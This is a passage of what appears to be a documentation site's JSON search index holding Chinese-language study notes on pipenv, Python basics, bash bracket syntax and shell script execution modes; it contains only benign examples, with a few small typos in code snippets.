\uff0c\u8f93\u5165<code>Python: Select Interpreter</code> \uff0c\u9009\u62e9\u5bf9\u5e94\u521b\u5efa\u7684 pipenv \u865a\u62df\u73af\u5883\u4e2d\u7684 python \u89e3\u91ca\u5668\u3002</p> <p>\u4e0b\u8f7d\u4f9d\u8d56\u4e0d\u518d\u4f7f\u7528 <code>pip install</code> \u547d\u4ee4\uff0c\u800c\u662f <code>pipenv install []</code> \uff0c\u5b83\u4f1a\u5c06\u4f9d\u8d56\u81ea\u52a8\u5199\u5165 <code>pipfile.lock</code> \u4e2d\uff0c\u6b64\u540e\u5728\u9879\u76ee\u4e2d\u62e5\u6709\u8be5\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c <code>pipenv install</code> \u547d\u4ee4\uff0c\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u8be5\u6587\u4ef6\u4e2d\u8bb0\u5f55\u7684\u6240\u6709\u4f9d\u8d56\u3002</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4f7f\u7528 <code>pipenv shell</code> \u8fdb\u5165 shell \u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>pip install</code> \u5b89\u88c5\u4f9d\u8d56\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5b89\u88c5\u7684\u4f9d\u8d56\u4e0d\u4f1a\u5199\u5165 <code>pipfile.lock</code> \u4e2d\u3002</p>"},{"location":"language/python/install/#reference","title":"Reference","text":"<ul> <li>Python \u6700\u4f73\u5b9e\u8df5\u6307\u5357\uff1a\u5b89\u88c5 Pipenv</li> <li>Github | Pyenv\uff1a\u5b89\u88c5 Pyenv</li> </ul>"},{"location":"language/python/usage/","title":"Python \u4f7f\u7528","text":""},{"location":"language/python/usage/#python_1","title":"Python \u57fa\u7840","text":"<p>\u5173\u952e\u8bb0\u5fc6\uff1a</p> <p>sort()\u51fd\u6570\u5bf9\u5217\u8868\u8fdb\u884c \u6c38\u4e45 \u6392\u5e8f</p> <p>sorted()\u51fd\u6570\u5bf9\u5217\u8868\u8fdb\u884c \u4e34\u65f6 \u6392\u5e8f</p> <p>reverse()\u53cd\u8f6c\u5217\u8868</p> <p>len()\u83b7\u53d6\u5217\u8868\u957f\u5ea6</p> <p>\u5217\u8868\uff1a[]</p> <p>append(value)</p> <p>insert(index,value)</p> <p>remove(value) \u6309\u503c\u5220\u9664</p> <p>pop() \u5f39\u51fa\u6700\u65b0\u503c,\u6216\u6307\u5b9a\u7d22\u5f15</p> <p>del list[index] \u6309\u7d22\u5f15\u5220\u9664</p> <p>clear() \u5220\u9664\u6240\u6709\u5143\u7d20</p> <p>\u5217\u8868\u751f\u6210\u5f0f\uff1alist = [<code>x \u7684\u8868\u8fbe\u5f0f</code> for x in <code>list/mp \u7b49</code>]</p> <p>\u5143\u7ec4\uff1a()\uff0c\u5143\u7ec4\u5c31\u662f\u4e0d\u53ef\u53d8\u7684\u5217\u8868</p> <p>\u5b57\u5178\uff08\u6620\u5c04\uff0cmap\uff09\uff1a{key:value , key:value}</p> <p>\u6dfb\u52a0\\\u4fee\u6539\u5b57\u5178\u5143\u7d20\uff1amap[key]=value</p> <p>\u5220\u9664</p> <ol> <li>clear() \u5220\u9664\u5b57\u5178\u5185\u6240\u6709\u5143\u7d20</li> <li>pop() \u5220\u9664\u5934\u90e8\uff0c\u6216\u8005\u6307\u5b9a\u503c</li> <li>popitem() \u968f\u673a\u8fd4\u56de\u5e76\u5220\u9664\u4e00\u5bf9\u952e\u503c\u5bf9</li> <li>del \u5168\u5c40\u65b9\u6cd5\uff0cdel map[index] \u5220\u9664\u7d22\u5f15\uff0cdel map \u6e05\u7a7a\u5b57\u5178</li> <li>.items() \u8fd4\u56de\u53ef\u904d\u5386\u7684\u952e\u503c\u5bf9\u5143\u7956\u6570\u7ec4</li> <li>.values() \u53ef\u904d\u5386\u7684\u503c</li> </ol> <p>for \u5faa\u73af\uff1a</p> <pre><code>for x in xs :\n \u00a0\u5faa\u73af\u5185\u5bb9\uff08\u6ce8\u610f\u7f29\u8fdb\uff09\n\nict = {'Google': 'www.google.com', 'Runoob': 'www.runoob.com', 'taobao': 'www.taobao.com'}\n\nprint \"\u5b57\u5178\u503c : %s\" % \u00a0dict.items()\n\n# \u904d\u5386\u5b57\u5178\u5217\u8868\nfor key,values in \u00a0dict.items():\n \u00a0 \u00a0print key,values\n</code></pre> <p>while \u5faa\u73af\uff1a</p> <pre><code>while x:\n \u00a0\u5faa\u73af\u5185\u5bb9\n</code></pre> <p>if \u8bed\u53e5\uff1a</p> <pre><code>if x :\n \u00a0if\u5185\u5bb9\nelif x :\n \u00a0elif\u5185\u5bb9\nelse :\n \u00a0else\u5185\u5bb9\n</code></pre> <p>if \u4f18\u5316\uff1a</p> <p>\u5728\u6761\u4ef6\u5224\u65ad\u4e2d\u4f7f\u7528 all() / any()</p> <p><code>all()</code> \u548c <code>any()</code> \u4e24\u4e2a\u51fd\u6570\u975e\u5e38\u9002\u5408\u5728\u6761\u4ef6\u5224\u65ad\u4e2d\u4f7f\u7528\u3002\u8fd9\u4e24\u4e2a\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5176\u4e2d\uff1a</p> <ul> <li><code>all(seq)</code>\uff1a\u4ec5\u5f53 <code>seq</code> \u4e2d\u6240\u6709\u5bf9\u8c61\u90fd\u4e3a\u5e03\u5c14\u771f\u65f6\u8fd4\u56de <code>True</code>\uff0c\u5426\u5219\u8fd4\u56de <code>False</code></li> <li> <p><code>any(seq)</code>\uff1a\u53ea\u8981 <code>seq</code> \u4e2d\u4efb\u4f55\u4e00\u4e2a\u5bf9\u8c61\u4e3a\u5e03\u5c14\u771f\u5c31\u8fd4\u56de <code>True</code>\uff0c\u5426\u5219\u8fd4\u56de <code>False</code></p> </li> <li> <p><code>url.startswith('http')</code>   \u8fd4\u56de\u4e00\u4e2a bool \u7c7b\u578b\u7684\u503c\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5224\u65ad url \u662f\u5426\u4ee5 http \u5f00\u5934</p> </li> </ul> <p>\u6587\u6863\u6ce8\u91ca</p> <pre><code>def \u51fd\u6570x\n\"\"\"\nsummary \u7b80\u8981\u7684\u6982\u8ff0\n\nArgs: \u8bf4\u660e\u53c2\u6570\n    :param1\uff1a\n    :param2\uff1a\n\nReturns\uff1a\u8bf4\u660e\u8fd4\u56de\u503c\n\nRaises:\u5217\u51fa\u4e0e\u63a5\u53e3\u6709\u5173\u7684\u6240\u6709\u5f02\u5e38\n\n\"\"\"\n</code></pre>"},{"location":"language/python/usage/#_1","title":"\u7279\u6b8a\u6587\u4ef6","text":"<p><code>__init__.py</code>\u6587\u4ef6\u7528\u4e8e\u6807\u8bc6\u5f53\u524d\u6587\u4ef6\u5939\u662f\u4e00\u4e2a\u5305\uff0c\u8be5\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u5728\u5bfc\u5165\u8fd9\u4e2a\u5305\u7684\u65f6\u5019\u4f1a\u8fd0\u884c</p> <p><code>egg-info</code>\u6587\u4ef6\u5939\u4e00\u822c\u7528\u4e8e\u5b58\u653e\u6e90\u4fe1\u606f\uff0c\u6bd4\u5982 Python \u7248\u672c\u4fe1\u606f\u7b49</p> <p>\u521d\u59cb\u5316\u53c2\u6570\uff1a<code>def fuc(age:int=10)</code></p> <p>\u5373\uff1aage \u662f\u4e00\u4e2a int \u7c7b\u578b\uff0c\u82e5\u6ca1\u6709\u6307\u5b9a\u4f20\u5165\uff0c\u5219\u8fd9\u4e2a\u503c\u9ed8\u8ba4\u4e3a 10</p>"},{"location":"language/python/usage/#_foo-__foo-__foo__","title":"<code>_foo</code> <code>__foo</code> <code>__foo__</code>","text":"<ul> <li><code>__foo__</code>: \u5b9a\u4e49\u7684\u662f\u7279\u6b8a\u65b9\u6cd5\uff0c\u4e00\u822c\u662f\u7cfb\u7edf\u5b9a\u4e49\u540d\u5b57 \uff0c\u7c7b\u4f3c <code>__init__()</code> \u4e4b\u7c7b\u7684.</li> <li><code>_foo</code>: \u4ee5\u5355\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u8868\u793a\u7684\u662f protected \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5373\u4fdd\u62a4\u7c7b\u578b\u53ea\u80fd\u5141\u8bb8\u5176\u672c\u8eab\u4e0e\u5b50\u7c7b\u8fdb\u884c\u8bbf\u95ee\uff0c\u4e0d\u80fd\u7528\u4e8e from module import *</li> <li><code>__foo</code>: \u53cc\u4e0b\u5212\u7ebf\u7684\u8868\u793a\u7684\u662f\u79c1\u6709\u7c7b\u578b(private)\u7684\u53d8\u91cf, \u53ea\u80fd\u662f\u5141\u8bb8\u8fd9\u4e2a\u7c7b\u672c\u8eab\u8fdb\u884c\u8bbf\u95ee\u4e86\u3002</li> </ul>"},{"location":"language/python/usage/#json","title":"json","text":"<ul> <li>json.dumps()\uff1a\u5c06 dict \u641e\u6210 json \u5b57\u7b26\u4e32</li> <li>json.dump()\uff1a</li> <li>json.load(r\u2019path/to/file.json\u2019)</li> <li>json.loads()\uff1a\u52a0\u8f7d json \u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u4e3a dict</li> </ul>"},{"location":"language/python/usage/#_2","title":"\u4f2a\u5168\u5c40\u53d8\u91cf","text":"<p>\u60f3\u5b9a\u4e49\u4e00\u4e9b\u5168\u5c40\u53c2\u6570\u65f6\uff0c\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a\u6587\u4ef6 <code>[const.py](http://const.py)</code> \uff0c\u5176\u4e2d\u5b58\u653e\u53d8\u91cf\uff0c\u5982\uff1a</p> <pre><code>// const.py\nAUTHOR=\"HappyTsing\"\n\n// main.py\nfrom const.py import AUTHOR\nprint(AUTHOR)\n</code></pre> <p>\u6b64\u540e\uff0c\u53ea\u9700\u8981\u5bfc\u5165\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002\u4e5f\u53ef\u4ee5\u76f4\u63a5 <code>from [const.py](http://const.py) import *</code> \u3002</p>"},{"location":"language/python/usage/#pymysql","title":"pymysql","text":"<p>https://www.cnblogs.com/chenhuabin/p/11241195.html</p>"},{"location":"language/shell/bracket/","title":"Difference: ()\u3001(())\u3001[]\u3001[[]]\u3001{}","text":""},{"location":"language/shell/bracket/#_1","title":"\u4e00\u3001()","text":""},{"location":"language/shell/bracket/#11-shell","title":"1.1 \u547d\u4ee4\u7ec4\uff1a\u65b0\u5f00\u5b50 shell \u6267\u884c","text":"<p><code>(cmd1;cmd2;cmd3)</code>\uff0c\u62ec\u53f7\u4e2d\u7684\u547d\u4ee4\u5c06\u4f1a <code>\u65b0\u5f00\u4e00\u4e2a\u5b50shell</code> \u987a\u5e8f\u6267\u884c\uff0c\u56e0\u6b64\uff1a</p> <ul> <li>\u62ec\u53f7\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\u4e0d\u80fd\u88ab\u811a\u672c\u4f59\u4e0b\u7684\u90e8\u5206\u4f7f\u7528</li> <li>\u62ec\u53f7\u4e2d\u591a\u4e2a\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7 <code>;</code> \u9694\u5f00</li> </ul> <pre><code>#!/bin/bash\necho $$\necho $BASHPID\n(echo $$;echo $BASHPID)\n\n$ source test.sh\n915416\n915416\n915416\n918116  #()\u4f1a\u5f00\u4e00\u4e2a\u65b0\u7684\u5b50shell\u6765\u8fd0\u884c\uff0c\u56e0\u6b64 $BASHPID \u53d1\u751f\u4e86\u6539\u53d8\n</code></pre>"},{"location":"language/shell/bracket/#12","title":"1.2 \u5b50\u547d\u4ee4\u6269\u5c55\uff1a$()","text":"<p>\u5b50\u547d\u4ee4\u6269\u5c55\u53c8\u79f0\u547d\u4ee4\u66ff\u6362\uff1a<code>$(...)</code>\u53ef\u4ee5\u6269\u5c55\u6210\u53e6\u4e00\u4e2a\u547d\u4ee4\u7684\u8fd0\u884c\u7ed3\u679c\uff0c\u8be5\u547d\u4ee4\u7684\u6240\u6709\u8f93\u51fa\u90fd\u4f1a\u4f5c\u4e3a\u8fd4\u56de\u503c\u3002</p> <p><code>$(...)</code>\u53ef\u4ee5\u5d4c\u5957\uff0c\u6bd4\u5982<code>$(ls $(pwd))</code>\u3002</p> <p>\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <pre><code># 1. \u53cd\u5f15\u53f7``\nval=`echo \"this is a command\"`\n\n# 2. $()\nval=$(echo \"this is acommand\")\n</code></pre>"},{"location":"language/shell/bracket/#13-arraya-b-c","title":"1.3 \u521d\u59cb\u5316\u6570\u7ec4\uff1aarray=(a b c)","text":""},{"location":"language/shell/bracket/#_2","title":"\u4e8c\u3001(())","text":""},{"location":"language/shell/bracket/#21","title":"2.1 \u7279\u6027","text":"<ul> <li>\u81ea\u52a8\u5ffd\u7565\u5185\u90e8\u7a7a\u683c</li> <li>\u53ea\u8981\u7b97\u6570\u7ed3\u679c\u4e0d\u662f <code>0</code> \uff0c\u547d\u4ee4\u5c31\u7b97\u6267\u884c\u6210\u529f\uff0c\u5373 <code>$?</code> \u8fd4\u56de <code>0</code> \u3002</li> <li>\u4e0d\u53ef\u4ee5\u8f93\u5165\u975e\u6574\u6570\uff0c\u4e14\u8fd4\u56de\u7ed3\u679c\u603b\u662f\u6574\u6570\uff0c\u6bd4\u5982\uff1a <code>echo $((5 / 2)</code>\uff0c\u8fd4\u56de 2 \u800c\u4e0d\u662f 2.5</li> <li><code>((...))</code>\u5185\u90e8\u53ef\u4ee5\u7528\u5706\u62ec\u53f7\u6539\u53d8\u8fd0\u7b97\u987a\u5e8f</li> <li>\u53ef\u4ee5\u5d4c\u5957</li> <li><code>((...))</code> \u5185\u90e8\u53d8\u91cf\u65e0\u9700\u4f7f\u7528 <code>$</code> \u7b26\u53f7\u524d\u7f00\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528</li> </ul>"},{"location":"language/shell/bracket/#22","title":"2.2 \u652f\u6301\u7684\u8fd0\u7b97\u7b26","text":"<ul> <li>\u7b97\u6570\u8fd0\u7b97\u7b26\uff1a <code>+ - * / % ** ++ \u2014</code></li> <li>\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26\uff1a <code>&lt;&lt; &gt;&gt; &amp; | ~ ^</code></li> <li>\u903b\u8f91\u8fd0\u7b97\u7b26\uff1a <code>&lt; &gt; &lt;= &gt;= == != &amp;&amp; || ! expr?expr2:expr3</code></li> <li>\u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a <code>= += -= /= %= &lt;&lt;= &gt;&gt;= &amp;= |= ^=</code></li> </ul>"},{"location":"language/shell/bracket/#23","title":"2.3 \u603b\u7ed3","text":"<p>\u603b\u7684\u6765\u8bf4\uff0c <code>(())</code> \u5185\u90e8\u7684\u8bed\u6cd5\u548c\u9ad8\u7ea7\u8bed\u8a00\u53ca\u5176\u76f8\u4f3c\uff0c\u65e0\u9700\u7279\u6b8a\u8bb0\u5fc6\uff01\u5e38\u7528\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code># 1. \u8d4b\u503c\na=5;((a++))\n((a+=2))\n\n# 2. \u8ba1\u7b97\nval=`expr 1 + 1`\nval=$((1+1))\nlet val=1+1\n\n# 3. \u7b97\u6570\u6bd4\u8f83\na=1;\nif ((a&lt;5))   # \u76f8\u5f53\u4e8eif [ $a -lt 5 ]\u3002\nthen\n    echo \"a&lt;5\"\nelse\n    echo \"a&gt;=5\"\nif\n\n# 4. \u4e09\u76ee\u8fd0\u7b97\necho $((a&gt;1 ? 1 : 0))\n</code></pre>"},{"location":"language/shell/bracket/#_3","title":"\u4e09\u3001[]\u3001[[]]","text":"<p>\u4e0d\u5efa\u8bae\u4f7f\u7528</p> <p>\u4f5c\u7528\u548c<code>(())</code> \u7c7b\u4f3c\uff0c\u4f46 <code>(())</code> \u66f4\u73b0\u4ee3\u5316\uff01</p> <p>In Short:</p> <ul> <li>[] is a bash Builtin</li> <li>[[]] are bash Keywords</li> </ul> <p>Keywords: Keywords are quite like builtins, but the main difference is that special parsing rules apply to them. For example, [ is a bash builtin, while [[ is a bash keyword. They are both used for testing stuff, but since [[ is a keyword rather than a builtin, it benefits from a few special parsing rules which make it a lot easier:</p> <pre><code>  $ [ a &lt; b ]\n -bash: b: No such file or directory\n  $ [[ a &lt; b ]]\n</code></pre> <p>The first example returns an error because bash tries to redirect the file b to the command [ a ]. The second example actually does what you expect it to. The character &lt; no longer has its special meaning of File Redirection operator.</p> <p>Source: http://mywiki.wooledge.org/BashGuide/CommandsAndArguments</p> <p>Single Bracket i.e. <code>[]</code> is POSIX shell compliant to to enclose a conditional expression.</p> <p>Double Brackets i.e. <code>[[]]</code> is an enhanced (or extension) version of standard POSIX version, this is supported by bash and other shells(zsh,ksh).</p> <p>\u603b\u7ed3\uff1a <code>[]</code> \u517c\u5bb9\u6027\u66f4\u597d\uff0c\u800c <code>[[]]</code>\u4e0d\u4e00\u5b9a\u517c\u5bb9 <code>/bin/sh</code> \u3002\u4f46\u662f <code>[[]]</code> \u4f7f\u7528\u8d77\u6765\u53ef\u80fd\u66f4\u4e3a\u65b9\u4fbf\uff0c\u5f88\u591a <code>[]</code> \u4f1a\u51fa\u95ee\u9898\u7684\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002</p> <p>Recommendation: always use <code>[]</code></p>"},{"location":"language/shell/bracket/#_4","title":"\u56db\u3001{}","text":""},{"location":"language/shell/bracket/#41-startendstep","title":"4.1 {start..end..step} \u6269\u5c55","text":"<p>\u5927\u62ec\u53f7\u53ef\u4ee5\u7701\u7565\u6b65\u957f <code>step</code>\uff0c\u5373 <code>{start..end}</code>\uff0c\u8868\u793a\u6269\u5c55\u6210\u4e00\u4e2a\u8fde\u7eed\u5e8f\u5217\u3002\u6bd4\u5982\uff0c<code>{a..z}</code>\u53ef\u4ee5\u6269\u5c55\u6210 26 \u4e2a\u5c0f\u5199\u82f1\u6587\u5b57\u6bcd\uff0c <code>{1..5}</code> \u53ef\u4ee5\u6269\u5c55\u6210 1 \u81f3 5\uff0c\u4e5f\u652f\u6301 <code>\u9006\u5e8f</code> \u3002\u5982\u679c\u6574\u6570\u524d\u9762\u6709\u524d\u5bfc<code>0</code>\uff0c\u6269\u5c55\u8f93\u51fa\u7684\u6bcf\u4e00\u9879\u90fd\u6709\u524d\u5bfc<code>0</code> \uff0c <code>{001..005}</code> \u3002</p> <pre><code># \u7528\u90141\uff1a\u5d4c\u5957\u4f7f\u7528\uff0c\u5f62\u6210\u590d\u6742\u6269\u5c55\n$ echo .{mp{3..4},m4{a,b,p,v}}\n.mp3 .mp4 .m4a .m4b .m4p .m4v\n\n# \u7528\u90142\uff1a\u591a\u4e2a\u7b80\u5199\u5f62\u5f0f\u8fde\u7528\uff0c\u5f62\u6210\u5faa\u73af\u5904\u7406\u6548\u679c\n$ echo {a..c}{1..3}\na1 a2 a3 b1 b2 b3 c1 c2 c3\n\n# \u7528\u90143\uff1a\u7528\u4e8efor\u5faa\u73af\nfor i in {1..4}\ndo\n  echo $i\ndone\n</code></pre>"},{"location":"language/shell/bracket/#42","title":"4.2 \u4ee3\u7801\u5757","text":"<p>\u53c8\u88ab\u79f0\u4e3a\u5185\u90e8\u7ec4\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4e8b\u5b9e\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u533f\u540d\u51fd\u6570 \u3002\u4e0e\u5c0f\u62ec\u53f7\u4e2d\u7684\u547d\u4ee4\u4e0d\u540c\uff0c\u5927\u62ec\u53f7\u5185\u7684\u547d\u4ee4\u4e0d\u4f1a\u65b0\u5f00\u4e00\u4e2a\u5b50 shell \u8fd0\u884c\uff0c\u5373\u811a\u672c\u4f59\u4e0b\u90e8\u5206\u4ecd\u53ef\u4f7f\u7528\u62ec\u53f7\u5185\u53d8\u91cf\u3002\u62ec\u53f7\u5185\u7684\u547d\u4ee4\u95f4\u7528\u5206\u53f7\u9694\u5f00\uff0c\u6700\u540e\u4e00\u4e2a\u4e5f\u5fc5\u987b\u6709\u5206\u53f7\u3002{}\u7684\u7b2c\u4e00\u4e2a\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\u3002</p>"},{"location":"language/shell/bracket/#43-shell","title":"4.3 \u547d\u4ee4\u7ec4\uff1a\u5f53\u524d shell \u6267\u884c","text":"<p><code>{ cmd1;cmd2;cmd3;}</code>\u5728 <code>\u5f53\u524dshell\u987a\u5e8f</code>\u6267\u884c\u547d\u4ee4\uff1a</p> <ul> <li>\u5404\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00</li> <li>\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u540e\u5fc5\u987b\u6709\u5206\u53f7</li> <li>\u7b2c\u4e00\u6761\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u7528\u7a7a\u683c\u9694\u5f00</li> </ul> <pre><code>#!/bin/bash\necho $$\necho $BASHPID\n{ echo $$;echo $BASHPID;}\n\n$ source test.sh\n915416\n915416\n915416\n915416\n</code></pre>"},{"location":"language/shell/bracket/#reference","title":"Reference","text":"<ul> <li>What is the difference between double and single square brackets in bash?</li> <li>shell \u4e2d\u5404\u79cd\u62ec\u53f7\u7684\u4f5c\u7528</li> </ul>"},{"location":"language/shell/grammar/","title":"Shell\uff1a\u8bed\u6cd5","text":""},{"location":"language/shell/grammar/#_1","title":"\u4e00\u3001\u7b80\u4ecb","text":"<p>Note</p> <p>\u672c\u6587\u57fa\u4e8e bash\uff0c\u540c\u65f6\u4e5f\u4f1a\u8ba8\u8bba\u4e00\u4e9b zsh \u7684\u7279\u6027\uff01</p> <ul> <li>shell\uff1aC \u8bed\u8a00\u7f16\u5199\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u4e00\u4e2a\u754c\u9762\uff0c\u7528\u6237\u901a\u8fc7\u8be5\u754c\u9762\u8f93\u5165\u547d\u4ee4\u8bbf\u95ee Linux \u670d\u52a1</li> <li>shell script\uff1a\u4e3a shell \u7f16\u5199\u7684\u811a\u672c\u7a0b\u5e8f\uff0c\u6587\u4ef6\u540e\u7f00\u4e3a <code>.sh</code></li> <li>shell interpreter\uff1a\u811a\u672c\u89e3\u91ca\u5668\uff0c\u79cd\u7c7b\u4f17\u591a\uff0csh\u3001bash\u3001zsh</li> </ul>"},{"location":"language/shell/grammar/#_2","title":"\u4e8c\u3001\u6307\u5b9a\u811a\u672c\u89e3\u91ca\u5668","text":"<p>\u5728 shell \u811a\u672c\uff0c<code>#!</code>\u00a0 \u544a\u8bc9\u7cfb\u7edf\u5176\u540e\u8def\u5f84\u6240\u6307\u5b9a\u7684\u7a0b\u5e8f\u5373\u662f\u89e3\u91ca\u6b64\u811a\u672c\u6587\u4ef6\u7684 Shell \u89e3\u91ca\u5668\u3002<code>#!</code>\u00a0 \u88ab\u79f0\u4f5cshebang\uff08\u4e5f\u79f0\u4e3a Hashbang \uff09\u3002</p> <p>\u51fa\u73b0\u5728 shell \u811a\u672c\u7684\u7b2c\u4e00\u884c\uff0c\u6709\u4e24\u79cd\u5199\u6cd5\uff1a</p> <ul> <li>\u76f4\u63a5\u6307\u5b9a\uff1a <code>#!/bin/sh</code> \u3001 <code>#!/bin/bash</code></li> <li>\u81ea\u52a8\u6307\u5b9a\uff1a <code>#!/usr/bin/env bash</code></li> </ul> <p>Tip</p> <p>\u5f53\u4f7f\u7528\u65b9\u6cd5\u4e8c\u81ea\u52a8\u6307\u5b9a\u65f6\uff0c\u7cfb\u7edf\u81ea\u52a8\u5728 PATH \u73af\u5883\u53d8\u91cf\u4e2d\u67e5\u627e\u4f60\u6307\u5b9a\u7684\u7a0b\u5e8f\u3002</p> <p>\u56e0\u6b64 \u5f3a\u70c8\u63a8\u8350 \u4f7f\u7528\u8be5\u5199\u6cd5\uff0c\u56e0\u4e3a\u7a0b\u5e8f\u7684\u8def\u5f84\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u800c\u4e14\u76f4\u63a5\u6307\u5b9a\u53ef\u80fd\u8fd8\u4f1a\u8bbe\u8ba1 shell \u7248\u672c\u7684\u95ee\u9898\uff0c\u800c PATH \u4e2d\u7684\u7248\u672c\u603b\u662f\u5f53\u524d\u5e0c\u671b\u4f7f\u7528\u7684\u3002</p>"},{"location":"language/shell/grammar/#shell_1","title":"\u4e09\u3001shell \u6a21\u5f0f","text":"<ul> <li>\u4ea4\u4e92\u6a21\u5f0f\uff1a\u624b\u52a8\u8f93\u5165\u4e00\u4e9b\u5217 Linux \u547d\u4ee4\uff0c\u6bd4\u5982 <code>ls</code> \u3001 <code>cd</code> \u7b49</li> <li>\u975e\u4ea4\u4e92\u6a21\u5f0f\uff1a\u53ef\u4ee5\u7406\u89e3\u4e3a\u6267\u884c shell \u811a\u672c\uff0cshell \u4ece\u6587\u4ef6\u6216\u7ba1\u9053\u4e2d\u8bfb\u53d6\u547d\u4ee4\u5e76\u6267\u884c\uff0c\u5f53 shell \u89e3\u91ca\u5668\u6267\u884c\u5b8c\u6587\u4ef6\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\uff0cshell \u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5e76\u56de\u5230\u7236\u8fdb\u7a0b\u3002</li> <li>\u5728\u65b0\u8fdb\u7a0b\u4e2d\u8fd0\u884c shell \u811a\u672c<ul> <li>\u5c06\u811a\u672c\u7a0b\u5e8f\u4f5c\u4e3a \u53ef\u6267\u884c\u7a0b\u5e8f \u8fd0\u884c\uff1a<code>./shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u9700\u8981\u5148\u7ed9\u811a\u672c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff1a <code>chmod +x shell_script.sh</code></li> <li>\u5c06 shell \u811a\u672c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 shell \u89e3\u91ca\u5668\uff1a<code>bash shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u7ed9\u811a\u672c\u6267\u884c\u6743\u9650\uff0c\u4e5f\u4e0d\u9700\u8981\u5728\u811a\u672c\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\u6307\u5b9a\u811a\u672c\u89e3\u91ca\u5668\uff0c\u6307\u5b9a\u4e86\u4e5f\u4f1a\u88ab\u5ffd\u7565\u3002</li> </ul> </li> <li>\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u8fd0\u884c shell \u811a\u672c\uff1a<code>source shell_script.sh</code> \uff0c\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5f3a\u5236\u6267\u884c\u811a\u672c\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u547d\u4ee4\uff0c\u4e0d\u9700\u8981\u7ed9\u811a\u672c\u6267\u884c\u6587\u4ef6\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\uff0c\u5f53\u6211\u4eec <code>source ~/.zshrc</code>\u7684\u65f6\u5019\uff0c\u914d\u7f6e\u4f1a\u7acb\u5373\u751f\u6548\uff0c\u662f\u56e0\u4e3a\u5c31\u662f\u5728\u5f53\u524d\u8fdb\u7a0b\u8fd0\u884c\u7684\uff01\u6ce8\u610f\uff0csource \u6267\u884c\u65f6\uff0c\u811a\u672c\u6587\u4ef6\u6307\u5b9a\u811a\u672c\u89e3\u91ca\u5668\u7684\u547d\u4ee4\u662f\u65e0\u6548\u7684\uff0c\u9ed8\u8ba4\u4f7f\u7528\u5f53\u524d shell\u3002</li> </ul> <p>Question</p> <p><code>source shell_script.sh</code> \u6709\u4e2a\u7b80\u5199\uff1a<code>. shell_script.sh</code></p> <p>\u4f46\u6211\u6d4b\u8bd5\u4e2d\u53d1\u73b0\u65e0\u6cd5\u5982\u6b64\u8c03\u7528\uff0c\u5374\u53ef\u4ee5\u8fd9\u6837\u8c03\u7528\uff1a <code>. ./shell_script.sh</code></p> <p>\u8bc1\u660e\u662f\u5426\u521b\u5efa\u65b0\u8fdb\u7a0b\uff1a</p> <pre><code>## test.sh\n#!/usr/bin/env bash\necho \"test\"\necho $$  ## \u8f93\u51fa\u5f53\u524d\u8fdb\u7a0bPID\n</code></pre> <p></p> <p>\u5982\u56fe\u6240\u793a\uff1a\u5f53\u524d\u8fdb\u7a0b PID=356020 \uff0c\u5728\u8fd0\u884c <code>bash test.sh</code> \u65f6\u7684 PID=379044 \uff0c\u8bf4\u660e\u662f\u5728\u65b0\u8fdb\u7a0b\u4e0b\u8fd0\u884c\u7684\uff0c\u800c\u8fd0\u884c <code>source test.sh</code> \u65f6\uff0c PID=356020 \u5e76\u672a\u53d1\u751f\u53d8\u5316\uff0c\u8bf4\u660e\u662f\u5728\u5f53\u524d\u8fdb\u7a0b\u4e0b\u8fd0\u884c\u7684\u3002</p>"},{"location":"language/shell/grammar/#_3","title":"\u56db\u3001\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li>\u53d6\u7528\u53d8\u91cf\uff1a <code>$var</code>\u3001 <code>${var}</code>\uff0c\u4f8b\u5982\u5f15\u7528\u73af\u5883\u53d8\u91cf\uff1a$PATH</li> <li>\u5220\u9664\u53d8\u91cf\uff1a <code>unset var</code></li> <li>\u83b7\u53d6\u5b57\u7b26\u4e32/\u6570\u7ec4\u957f\u5ea6\uff1a <code>${#string}</code>\u3001 